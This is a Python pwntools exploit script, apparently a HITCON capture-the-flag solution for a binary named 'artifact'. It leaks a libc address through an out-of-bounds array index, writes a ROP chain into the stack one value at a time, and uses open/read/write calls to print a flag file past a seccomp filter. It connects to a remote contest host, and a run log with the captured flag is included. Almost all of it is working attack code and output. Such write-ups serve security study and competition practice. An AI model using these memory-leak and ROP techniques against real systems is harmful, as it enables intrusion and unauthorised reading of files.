#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64', os='linux', aslr=False, terminal=['tmux', 'neww'])
env = {'LD_PRELOAD': './libc.so.6'}

if args['GDB']:
    io = gdb.debug(
        './artifact',
        env=env,
        gdbscript='''\
        set follow-fork-mode parent
        b *0x555555554ba6
        c
    ''')
    elf, libc = io.elf, io.libc
elif args['REMOTE']:
    io = remote('52.192.178.153', 31337)
    elf, libc = ELF('./artifact'), ELF('./libc.so.6')
else:
    io = process('./artifact', env=env)
    elf, libc = io.elf, io.libc

# find the address of libc
io.recvuntil('Choice?\n')
io.sendline('1')
io.recvuntil('Idx?\n')
index = 0x650 / 8 + 1
io.sendline(str(index))
a_libc_address = int(io.recvline()[len('Here it is: '):])
libc.address = a_libc_address - 0x0000000000020300 - 241
success('libc.address: %s' % hex(libc.address))

# find any writeable location
buf = libc.address + 0x3c1800

# read a filename into buf, open the file, read its content and write it back
rop = ROP(libc)
rop.read(0, buf, 5)
rop.open(buf, 0, 2)
rop.read(3, buf, 50)
rop.write(1, buf, 50)

# set up the ROP chain in the stack
raw_rop = str(rop)
for i, address in enumerate([u64(raw_rop[i:i + 8]) for i in range(0, len(raw_rop), 8)]):
    print 'Sending', i
    io.recvuntil('Choice?\n')
    io.sendline('2')
    io.recvuntil('Idx?\n')
    index = 0x650 / 8 + 1 + i
    io.sendline(str(index))
    io.recvuntil('Give me your number:\n')
    io.sendline(str(address))

# exit to trigger ROP execution
io.recvuntil('Choice?\n')
io.sendline('3')

sleep(0.1)
io.send('flag\x00')

io.interactive()

# $ ./artifact.py REMOTE
# [+] Opening connection to 52.192.178.153 on port 31337: Done
# [*] '/home/ubuntu/vbox/artifact-4c4375825c4a08ae9d14492b34b3bddd/artifact'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [*] '/home/ubuntu/vbox/artifact-4c4375825c4a08ae9d14492b34b3bddd/libc.so.6'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] libc.address: 0x7fed4d6ab000
# [*] Loaded cached gadgets for './libc.so.6'
# Sending 0
# Sending 1
# . . .
# Sending 30
# Sending 31
# [*] Switching to interactive mode
# hitcon{why_libseccomp_cheated_me_Q_Q}
